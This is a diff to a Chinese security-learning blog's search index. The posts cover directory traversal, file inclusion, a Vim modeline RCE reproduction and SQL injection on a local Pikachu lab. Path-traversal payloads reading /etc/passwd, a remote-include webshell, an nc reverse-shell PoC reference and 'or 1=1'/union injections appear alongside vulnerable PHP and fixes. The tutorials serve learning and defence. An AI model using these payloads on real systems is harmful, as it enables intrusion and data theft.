@@ -6,12 +6,50 @@
     <content type="text"><![CDATA[该博客用于本人日常记录学习、复习过程，学习范围有Windows，Linux，安全，网络，C++，Python等内容，不定期更新！暂不开放评论功能（玻璃心）！]]></content>
   </entry>
   <entry>
+    <title><![CDATA[目录遍历]]></title>
+    <url>%2F2019%2F08%2F09%2F%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%2F</url>
+    <content type="text"><![CDATA[Directory Traversal 目录遍历漏洞危害：本台机器操作系统上文件进行读取使用者可以通过浏览器/URL地址或者参数变量内容，可以读取web根目录【默认为:/var/www/】之外的其他操作系统文件(如：/etc/passwd/)。形成漏洞根源：目录权限限制不严格]]></content>
+      <categories>
+        <category>WEB安全</category>
+        <category>PHP</category>
+        <category>文件目录安全</category>
+      </categories>
+      <tags>
+        <tag>文件目录安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CVE-2019-12735（Vim远程代码执行）漏洞复现]]></title>
+    <url>%2F2019%2F08%2F05%2FCVE-2019-12735%EF%BC%88Vim%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
+    <content type="text"><![CDATA[参考博客：https://blog.csdn.net/DarkHQ/article/details/92696160 一、实验环境 KaliLinux 2018 Vim 8.0.1401 二、漏洞影响版本 VIM &lt; 8.1.1365 Neovim &lt; 0.3.6 三、漏洞环境复现由于当前VIM版本没有默认开启modeline，需自己手动添加下，修改home/.vimrc文件，添加一条规则set modeline（如果没有.vimrc文件，自己手动创建一个）脚本是大佬pcy190编写的，链接：https://github.com/pcy190/ace-vim-neovim/一个尝试执行uname的poc，一个利用nc反弹shell的poc 四、漏洞复现侦听本机9999端口在一个新终端上使用VIM编辑poc_shell.txt 五、漏洞防护 更新vim到最新版本 禁用编辑器的 modeline功能，把set modeline 改为set nomodeline 利用vim编辑的时候，查看文件来源是否正规]]></content>
+      <categories>
+        <category>系统漏洞</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[文件包含与目录遍历]]></title>
+    <url>%2F2019%2F08%2F04%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%2F</url>
+    <content type="text"><![CDATA[实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika漏洞概述 程序开发人员希望代码更加灵活，所以通常会把可重复使用的函数写入到单个文件中，在使用某些函数时，用来进行动态调用，而无需再次编写，这种调用文件的过程被称为包含，但正是因为这种灵活性，导致客户端可以调用一个恶意文件，造成文件包含漏洞。 有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对传入的的文件进行合理的校验或校验被绕过，从而导致攻击者可以通过修改文件的位置来让后台操作其他文件，因此导致意外的文件泄露甚至恶意的代码注入。 Directory Traversal 目录遍历漏洞危害：本台机器操作系统上文件进行读取使用者可以通过浏览器/URL地址或者参数变量内容，可以读取web根目录【默认为:/var/www/】之外的其他操作系统文件(如：/etc/passwd/)。形成漏洞根源：目录权限限制不严格 File include文件包含漏洞危害： include本地文件包含LFI； 远程系统文件包含RFI（可传入木马）通常为如include函数，可以将web根目录以外的目录包含进来。 形成漏洞根源：include函数对输入变量限制不严，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码 文件包含的函数： 1234require()，找不到被包含的文件时会产生致命错误，并停止脚本运行。include()，找不到被包含的文件时只会产生警告，脚本将继续运行。include_once()与include()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。require_once()与require()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 常见漏洞特征： http://xxx/index.php?page=a.phphttp://xxx/index.php?home=b.htmlhttp://xxx/index.php?file=content 漏洞测试方法：?page=/etc/passwd?page=../../../../../../../../../../../etc/passwd?page=http://192.168.0.13/a.php #类UNIX系统根目录：/目录层级分隔符：/ #windows系统根目录：C:\，D:\，E:\ 等目录层级分隔符：\或/ 示例代码: 1234&lt;?php $filename = $_GET[&apos;filename&apos;]; include($filename);?&gt; $_GET[&#39;filename&#39;]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以通过修改$_GET[&#39;filename&#39;]的值，执行非预期的操作。 本地文件包含漏洞1.本地文件包含示例代码示例： 123456&lt;?phpif(isset($_GET[&apos;submit&apos;]) &amp;&amp; $_GET[&apos;filename&apos;]!=null)&#123; $filename=$_GET[&apos;filename&apos;]; include &quot;include/$filename&quot;;//变量传进来直接包含,没做任何的安全限制&#125;?&gt; 正常访问网页，提交查询kobe访问的网页URL为:http://192.168.31.193/pika/vul/fileinclude/fi_local.php?filename=file1.php&amp;submit=提交查询当提交参数filename值修改为../../../../../../../../../../flag.txt时，则页面内容改编为flag.txt文件内容 远程文件包含漏洞PHP的配置文件(/etc/php5/cgi/php.ini )中的allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。1.远程文件包含示例代码示例： 123456&lt;?phpif(isset($_GET[&apos;submit&apos;]) &amp;&amp; $_GET[&apos;filename&apos;]!=null)&#123; $filename=$_GET[&apos;filename&apos;]; include &quot;include/$filename&quot;;//变量传进来直接包含,没做任何的安全限制&#125;?&gt; 建立站点用来远程文件包含漏洞中被包含，URL:http://192.168.31.193/7/cmd.txt通过远程文件包含漏洞，包含http://192.168.31.193/7/cmd.txt在webshell中执行系统命令，查看当前用户]]></content>
+      <categories>
+        <category>WEB安全</category>
+        <category>PHP</category>
+        <category>文件目录安全</category>
+      </categories>
+      <tags>
+        <tag>文件目录安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[SQL盲注进阶——BurpSuite]]></title>
     <url>%2F2019%2F08%2F01%2FSQL%E7%9B%B2%E6%B3%A8%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%2F</url>
     <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika 二、Burpsuite——Intruder模块简介Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。 三、Intruder模块说明Burp Intruder主要有四个模块组成:1：Target 用于配置目标服务器进行攻击的详细信息。2：Positions 设置Payloads的插入点以及攻击类型（攻击模式）。3：Payloads 设置payload，配置字典4：Opetions 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。 四、搭配Intruder自动爆破数据库 将截断的数据包发送至Intruder 设置Pyloads的插入点 设置Pyload，导入字典 启动自动攻击观察攻击运行至什么pyload时，会停留延时]]></content>
       <categories>
         <category>WEB安全</category>
         <category>PHP</category>
+        <category>SQL注入</category>
       </categories>
       <tags>
         <tag>SQL注入</tag>
@@ -24,6 +62,7 @@
       <categories>
         <category>WEB安全</category>
         <category>PHP</category>
+        <category>SQL注入</category>
       </categories>
       <tags>
         <tag>SQL注入</tag>
@@ -36,6 +75,7 @@
       <categories>
         <category>WEB安全</category>
         <category>PHP</category>
+        <category>SQL注入</category>
       </categories>
       <tags>
         <tag>SQL注入</tag>
@@ -48,18 +88,20 @@
       <categories>
         <category>WEB安全</category>
         <category>PHP</category>
+        <category>环境搭建</category>
       </categories>
       <tags>
         <tag>Windows</tag>
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[SQL数字型注入-POST]]></title>
+    <title><![CDATA[SQL数字型注入 （POST）]]></title>
     <url>%2F2019%2F07%2F28%2FSQL%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-POST%2F</url>
     <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika 二、实验步骤 观察注入点尝试在表单的下拉菜单中提交任意数据，观察URL与网页URL：http://192.168.31.193/pika/vul/sqli/sqli_id.php ，如图2-1所示：可以看到页面回显正常，但URL部分没有传值参数，判断该网页请求方式为POST 检测注入点该网页请求方式为POST所以我们需要用到Hackbar或者BurpSuite，这里使用Burp设置好代理后重新提交参数，并用Burp截断HTTP的报文，如图2-2所示：将该报文发送至Repeater即可开始进行注入测试，如图2-3所示：尝试在id=1参数修改为id=1 or 1=1,然后发送报文，查看Response，如图2-4所示：可以看到我们拼接的逻辑运算语句正常运行，并把数据表中的所有数据都显示出来 查询显示的字段数尝试使用order by语句判断该网页表单能够显示的字段数，如图2-5所示： 获取当前数据库及运行数据库的用户名使用union select拼接SQL语句查看用户及数据库，如图2-6所示： 三、代码理解与防范 源代码(pika\vul\sqli\sqli_id.php) 12345678910111213141516171819$link=connect();$html=&apos;&apos;;if(isset($_POST[&apos;submit&apos;]) &amp;&amp; $_POST[&apos;id&apos;]!=null)&#123; //这里没有做任何处理，直接拼到select里面去了,形成Sql注入 $id=$_POST[&apos;id&apos;]; $query=&quot;select username,email from member where id=$id&quot;; $result=execute($link, $query); //这里如果用==1,会严格一点 if(mysqli_num_rows($result)&gt;=1)&#123; while($data=mysqli_fetch_assoc($result))&#123; $username=$data[&apos;username&apos;]; $email=$data[&apos;email&apos;]; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;hello,&#123;$username&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;&quot;; &#125; &#125;else&#123; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;您输入的user id不存在，请重新输入！&lt;/p&gt;&quot;; &#125;&#125; 通过判断参数类型对网页起到防护作用 1234567891011121314151617181920$link=connect();$html=&apos;&apos;;//&amp;&amp; id_numeric($_POST[&apos;id&apos;])判断从网页传入的值是否为数字，如果带有其他字符将不运行后面的代码if(isset($_POST[&apos;submit&apos;]) &amp;&amp; $_POST[&apos;id&apos;]!=null &amp;&amp; id_numeric($_POST[&apos;id&apos;]))&#123; //这里没有做任何处理，直接拼到select里面去了,形成Sql注入 $id=$_POST[&apos;id&apos;]; //数字型注入与字符型注入不同的地方是因为id=$id并没有使用符号进行闭合 $query=&quot;select username,email from member where id=$id&quot;; $result=execute($link, $query); //这里如果用==1,会严格一点 if(mysqli_num_rows($result)&gt;=1)&#123; while($data=mysqli_fetch_assoc($result))&#123; $username=$data[&apos;username&apos;]; $email=$data[&apos;email&apos;]; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;hello,&#123;$username&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;&quot;; &#125; &#125;else&#123; $html.=&quot;&lt;p class=&apos;notice&apos;&gt;您输入的user id不存在，请重新输入！&lt;/p&gt;&quot;; &#125;&#125;]]></content>
       <categories>
         <category>WEB安全</category>
         <category>PHP</category>
+        <category>SQL注入</category>
       </categories>
       <tags>
         <tag>SQL注入</tag>
@@ -72,6 +114,7 @@
       <categories>
         <category>WEB安全</category>
         <category>PHP</category>
+        <category>SQL注入</category>
       </categories>
       <tags>
         <tag>SQL注入</tag>
